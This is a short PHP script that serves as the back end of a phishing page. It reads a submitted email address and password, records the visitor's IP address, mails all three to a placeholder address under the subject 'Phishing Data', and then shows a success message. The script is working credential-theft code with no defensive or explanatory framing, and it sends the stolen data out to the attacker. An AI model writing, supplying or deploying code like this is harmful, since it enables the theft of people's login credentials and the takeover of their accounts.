<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    
    // Get the user's IP address
    $ip_address = $_SERVER['REMOTE_ADDR'];
    
    // Send data to your server (e.g., email, password, IP)
    mail('your-email@example.com', 'Phishing Data', "Email: $email\nPassword: $password\nIP Address: $ip_address");
    
    echo "<h2>Data Sent Successfully</h2>";
}
?>
